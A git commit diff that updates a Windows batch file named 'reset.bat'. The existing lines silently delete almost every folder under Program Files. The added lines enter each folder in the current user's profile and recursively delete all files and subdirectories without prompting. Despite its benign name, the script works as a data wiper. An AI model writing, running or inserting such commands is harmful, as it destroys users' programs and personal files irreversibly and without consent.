8d254271caa3d34347ce8f853ace69812b45cff5
AteebXYZ <130910481+AteebXYZ@users.noreply.github.com>
2023-12-27 04:48:56 -0800

    Update reset.bat

--- reset.bat
+++ reset.bat
@@ -6,3 +6,8 @@ for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Microsoft
 cd C:/"Program Files"
 for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
 cd C:/Users/%username%
+for /D %%A in (*) do (
+    cd "%%A"
+    del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
+    cd ..
+)
